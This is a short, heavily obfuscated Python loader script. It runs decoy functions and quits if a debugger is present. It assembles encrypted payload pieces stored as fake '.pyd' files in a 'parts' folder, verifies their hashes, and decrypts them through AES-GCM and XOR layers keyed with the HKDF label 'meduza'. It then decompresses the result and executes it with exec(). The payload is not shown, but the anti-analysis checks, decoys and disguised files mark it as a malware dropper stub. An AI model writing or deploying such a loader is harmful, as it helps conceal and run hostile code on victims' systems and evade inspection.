import itertools,math,datetime, fractions,decimal,statistics
import os as _o,sys as _s,base64 as _b64,zlib as _z,hashlib as _h,json as _j
from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AES
from cryptography.hazmat.primitives import hashes as _hash
from cryptography.hazmat.primitives.kdf.hkdf import HKDF as _HKDF
def _decoy1():return sum(range(100))
def _decoy2():return [x for x in range(50) if x%2==0]
def _decoy3():return {"a":1,"b":2,"c":3}
_decoy1();_decoy2();_decoy3()
def _chkarrxnr():
    import sys
    if hasattr(sys,"gettrace") and sys.gettrace():
        raise SystemExit("debug")
    for m in ["pdb","ipdb","pudb"]:
        if m in sys.modules:
            raise SystemExit("debug")
_chkarrxnr()
del _chkarrxnr
_blwjrie=_o.path.dirname(_o.path.abspath(__file__))
_dupfmvi=_b64.b64decode("cGFydHM=").decode()
_fugcpzx=tuple(_b64.b64decode("X19pbml0X18ucHlkLGluaXMucHlkLGl0Xy5weWQsY29yZS5weWQ=").decode().split(","))
def _xmyrrzm(_d,_k):return bytes((b^_k[i%len(_k)])for i,b in enumerate(_d))
def _dkvsrxst(_m):
    _kdf=_HKDF(algorithm=_hash.SHA256(),length=64,salt=None,info=_b64.b64decode("bWVkdXph"))
    _e=_kdf.derive(_m)
    return _e[:32],_e[32:]
def _aesksndjv(_d,_k):
    _a=_AES(_k[:32])
    return _a.decrypt(_d[:12],_d[12:],None)
def _mqtvpfo():
 with open(_o.path.join(_blwjrie,_dupfmvi,_b64.b64decode("bWV0YS5kYXQ=").decode()),"rb")as _f:_d=_f.read()
 _m=_j.loads(_b64.b64decode(_d).decode())
 _r=_b64.b64decode(_m["k"].encode())
 _k1,_k2=_dkvsrxst(_r)
 return _m,(_k1,_k2)
def _lsiximn(_m):
 _p=[]
 for i,_n in enumerate(_fugcpzx):
  _fp=_o.path.join(_blwjrie,_dupfmvi,_n)
  if not _o.path.isfile(_fp):raise _s.exit(_b64.b64decode("bWlzc2luZw==").decode())
  with open(_fp,"rb")as _f:_d=_f.read()
  if _h.sha256(_d).hexdigest()!=_m["h"][i]:
   raise _s.exit(_b64.b64decode("Y29ycnVwdA==").decode())
  _p.append(_d)
 return b"".join(_p)
def _rlyppoo():
 _m,(_k1,_k2)=_mqtvpfo()
 _d=_lsiximn(_m)
 _d=_b64.b64decode(_d)
 _d=_aesksndjv(_d,_k1)
 _d=_xmyrrzm(_d,_k2)
 _d=_aesksndjv(_d,_k1)
 _d=_z.decompress(_d)
 exec(_d,{"__name__":"__main__","__file__":_o.path.abspath(__file__),"__package__":None})
if __name__=="__main__":_rlyppoo()